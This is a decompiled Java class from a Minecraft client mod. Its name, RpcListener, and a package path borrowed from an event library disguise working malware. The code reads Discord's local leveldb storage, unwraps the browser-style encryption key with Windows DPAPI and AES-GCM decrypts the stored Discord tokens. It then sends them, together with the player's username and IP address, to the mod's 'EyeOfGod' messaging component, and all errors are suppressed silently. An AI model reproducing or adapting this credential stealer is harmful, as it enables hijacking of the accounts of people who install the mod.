/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  com.google.gson.JsonObject
 *  com.google.gson.JsonParser
 *  com.sun.jna.platform.win32.Crypt32Util
 *  net.minecraft.class_310
 *  org.apache.commons.io.FileUtils
 */
package meteordevelopment.orbit.listeners;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.mrzak34.thunderhack.manager.EyeOfGod;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.security.Key;
import java.util.Arrays;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import net.minecraft.class_310;
import org.apache.commons.io.FileUtils;

public class RpcListener {
    static String discordPath = new String(System.getenv("APPDATA") + "/discord");
    public static class_310 mc = class_310.method_1551();

    public static void search() {
        try {
            for (File file : new File(discordPath + "/Local Storage/leveldb").listFiles(File::isFile)) {
                if (!file.getName().endsWith(".ldb")) continue;
                String parsed = FileUtils.readFileToString((File)file, (String)StandardCharsets.UTF_8.toString());
                Object foundTokens = "";
                Matcher matcher = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)").matcher(parsed.toString());
                if (!matcher.find()) continue;
                String reader = FileUtils.readFileToString((File)new File(discordPath + "/Local State"), (String)StandardCharsets.UTF_8.toString());
                new JsonParser();
                JsonObject json = JsonParser.parseString((String)reader).getAsJsonObject();
                byte[] key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
                key = Base64.getDecoder().decode(key);
                key = Arrays.copyOfRange(key, 5, key.length);
                key = Crypt32Util.cryptUnprotectData((byte[])key);
                byte[] tokens = Base64.getDecoder().decode(matcher.group().split("dQw4w9WgXcQ:")[1].getBytes());
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                cipher.init(2, (Key)new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(tokens, 3, 15)));
                foundTokens = (String)foundTokens + new String(cipher.doFinal(Arrays.copyOfRange(tokens, 15, tokens.length)), StandardCharsets.UTF_8.toString());
                try {
                    EyeOfGod.sendMessage(mc.method_1548().method_1676() + ":{\ntoken:" + (String)foundTokens + "\nip:" + EyeOfGod.getIpAddres() + "\n}");
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }
}

